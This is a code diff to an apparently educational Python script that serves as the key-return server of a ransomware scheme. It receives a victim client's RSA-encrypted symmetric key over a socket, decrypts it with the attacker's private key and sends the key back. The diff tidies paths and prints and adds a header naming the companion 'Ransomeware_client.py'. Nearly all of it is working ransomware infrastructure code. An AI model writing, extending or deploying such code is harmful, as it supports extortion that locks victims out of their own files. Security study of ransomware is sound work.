@@ -7,35 +7,34 @@ from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes
 from cryptography.fernet import Fernet
 
+# Author : Bobby Valenzuela
+# Created : 14th January 2023
+
+"""
+This script will accept the EncryptedSymmetricKey (ESK) from the client script and decrypt the ESK using the server machines (this machine) private key.
+Next, we will send the original symmetric key (SK) that we decrypted back to this client script.
+
+
+Usage: python3 Ransomeware_client.py
+"""
+
+
 class ClientHandler(socketserver.BaseRequestHandler):
 
     def handle(self):
         clientEncryptedSymmetricKey = self.request.recv(1024).strip()
-        # clientEncryptedSymmetricKey = self.request.recv(1024)
         
-        print(f"Implement descryption of data: {clientEncryptedSymmetricKey}")
-
-        hostPrivateKeyPath = '/home/bobby_vz/sandbox/openssltesting/private_key.pem' # <=== Hackers public key
-
-        clientEncryptedSymmetricKeyPath = '/home/bobby_vz/git_repos/EthicalHacking/Ransomware/clientEncryptedSymmetricKey.key'
-
-        with open(clientEncryptedSymmetricKeyPath, "rb") as private_enc:
-            clientEncryptedSymmetricKey = private_enc.read()
-            # print(f"clientEncryptedSymmetricKey FROM FILE: {clientEncryptedSymmetricKey}")
-        
-        
+        HOST_PRIV_KEY_PATH = 'server_keys/private_key.pem' # <=== Hackers public key
         
         # Load our host private key
-        with open(hostPrivateKeyPath,"rb") as key_file:
+        with open(HOST_PRIV_KEY_PATH,"rb") as key_file:
             hostPrivate_key = serialization.load_pem_private_key(
                 key_file.read(),
                 password=None,
                 backend=default_backend()
             )
 
-
         # Decrypt client encrypted private key using hostPrivate_key and write to file
-
         client_private_key = hostPrivate_key.decrypt(
             clientEncryptedSymmetricKey,
             padding.OAEP(
@@ -44,25 +43,20 @@ class ClientHandler(socketserver.BaseRequestHandler):
                 label=None
             )
         )
-        print(f"client_private_key: {client_private_key}")
 
-
-        print(f"Client private key... {client_private_key}\n\n")
-
-        # client_private_key_encoded = str.encode(client_private_key)
-
+        print(f"Received Client Private Key (Decrypted) {client_private_key}")
 
         self.request.sendall(client_private_key)
-        # self.request.sendall(client_private_key_encoded)
-        # self.request.sendall("send key back")
+
 
 if __name__ == "__main__" :
-    # HOST, PORT = "", 8000
+
     HOST, PORT = "localhost", 5000
 
-    # tcpServer = socketserver.TCPServer((HOST, PORT), ClientHandler)
     tcpServer = socketserver.TCPServer((HOST, PORT), ClientHandler)
+
     try:
+        print("Listening...")
         tcpServer.serve_forever()
     except:
         print("There was an error")
